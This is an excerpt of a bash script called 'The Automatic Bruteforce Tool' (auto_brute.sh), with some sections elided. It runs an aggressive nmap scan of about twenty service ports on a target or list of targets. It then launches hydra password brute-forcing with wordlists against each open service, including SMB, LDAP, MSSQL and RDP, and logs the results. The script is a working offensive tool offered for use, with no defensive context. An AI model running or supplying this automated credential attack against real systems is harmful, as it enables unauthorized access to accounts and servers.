...
splash() {
	...
	echo -e "${default}      by: n1x_ ;edited_by: toxin , kambing95  ${red}|__|${default}${red}\/      |__|       "
	echo -e "       The Automatic Bruteforce Tool\n ${default}"
        echo -e " it brute force FTP,ss,telnet,smtp,pop3,smb,snmp,LDAP,smb,rexec,rlogin,rsh,IMAP,mssql,oracle,mysql,rdp,postgres,VNC "
}
...
port_scan() {
	...
	echo -e "[${yellow}*${default}] Starting agressive scan of supported ports against: ${name}...\n"
	sleep 1
	mkdir -p Scans/${name}
	nmap -T4 -Pn -vv --open $1 -p 21,22,23,25,110,139,162,389,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901 -oG Scans/${name}/masterscan
	grep "^Host" Scans/${name}/masterscan | grep "open" > Scans/${name}/openhost

	while read LINE
	do
		HOST=$(echo ${LINE} | cut -d' ' -f2)
		mkdir -p Scans/${1}/$HOST
		PORT="$(echo ${LINE} | cut -d':' -f3-)"
		OIFS=$IFS
		IFS=' '
		for P in $PORT
		do
			bruteforce $HOST $(echo $P | grep open | awk -F'/' '{print $1"/"$3}') ${2}
		done
		IFS=OIFS
	done<Scans/${name}/openhost
...
bruteforce() {
	mkdir -p Output/${1}
	thread=${3}
	if $(echo ${2} | grep -w -q 21/tcp); then
        ...
        if $(echo ${2} | grep -w -q 22/tcp); then
        ...
        if $(echo ${2} | grep -w -q 23/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 25/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 110/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 139/tcp) ; then
                echo -e "[${yellow}*${default}] Port 139(SMB) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $windows_u -P $win_pass $1 smb -S 139 -e ns -o Output/${1}/smb_139_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 139(SMB) is not open. Skipping to next port..."
        fi

        if $(echo ${2} | grep -w -q 162/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 389/tcp) ; then
                echo -e "[${yellow}*${default}] Port 389(LDAP) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $windows_u -P $win_pass $1 ldap2 -S 389 -e ns -o Output/${1}/ldap2_${1}.txt -I -V -t $thread
#		hydra -L $windows_u -P $pass $1 ldap3 -S 389 -e ns -o Output/${1}/ldap3_${1}.txt -I -V -t $thread
        ...
        if $(echo ${2} | grep -w -q 445/tcp) ; then
		...
		hydra -L $windows_u -P $win_pass $1 smb -S 445 -e ns -o Output/${1}/smb_445_2_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 445(SMB) is not open. Skipping to next port..."
        fi

        if $(echo ${2} | grep -w -q 512/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 513/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 514/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 993/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 1433/tcp) ; then
		...
		hydra -L $windows_u -P $win_pass $1 mssql -S 1433 -e ns -o Output/${1}/mssql_1_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 1433(mssql) is not open. Skipping to next port..."
        fi

        if $(echo ${2} | grep -w -q 1521/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 3306/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 3389/tcp) ; then
		...
		hydra -L $windows_u -P $win_pass $1 rdp -e ns -o Output/${1}/rdp_1_${1}.txt -I -V -t $thread
		finished_brute $1
        else
                echo -e "[${red}!${default}] Port 3389(RDP) is not open. Skipping to next port..."
        fi

        if $(echo ${2} | grep -w -q 5432/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 5900/tcp) ; then
        ...
        if $(echo ${2} | grep -w -q 5901/tcp) ; then
...
finished_brute() {
	...
	win_pass="Wordlist/win_pass.txt"
	...
	splash
        ...
        if [ $# -eq 0 ]; then
                ...
                echo -e "[${yellow}*${default}] Usage: ./auto_brute.sh <target/file> <threads>"
